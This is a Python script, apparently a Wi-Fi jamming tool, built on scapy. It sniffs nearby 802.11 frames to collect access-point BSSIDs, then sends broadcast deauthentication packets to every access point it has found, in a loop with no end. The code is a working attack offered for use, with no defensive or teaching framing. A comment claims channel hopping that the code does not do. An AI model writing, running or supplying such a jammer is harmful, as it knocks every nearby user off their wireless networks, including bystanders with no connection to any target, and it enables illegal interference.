import subprocess
import time

from scapy.all import *
from threading import Thread
from srcnj import wificardtools as wificard

#ap array
AP_BSSID = []
#used for the entire chunk of sniffing, holds all below functions together in a nice orderly fashion

def mainsniffer():
    x = 1
    
    while x == 1:
        global AP_BSSID 
        AP_BSSID = []
        global AP_SSID 
        AP_SSID = []
        
        sniff(iface="mon0", prn=pkt_callback, timeout=5)

        time.sleep(10)
        continue

#function that basically determines what happens with captured packets, pretty readable i think

def pkt_callback(pkt):
    if pkt.haslayer(Dot11Elt):
        if pkt.addr2 not in AP_BSSID:
            AP_BSSID.append(pkt.addr2)
            
#ATTACKS

def nodejammer():
    while True:
        scan = Thread(target=mainsniffer, args=[]) 
        scan.daemon = True
        scan.start()
    
        deauth_attack()

#finally done, broadcasts deauth packets to all scanned aps forever whilst also channel hopping
def deauth_attack():
    BROADCAST = "FF:FF:FF:FF:FF:FF"
    
    while True:    
        for bssid in AP_BSSID:
            pkt = RadioTap() / Dot11(addr1=BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
            sendp(pkt, iface="mon0", count=10, verbose=False)
            print("packet sent to " + bssid)
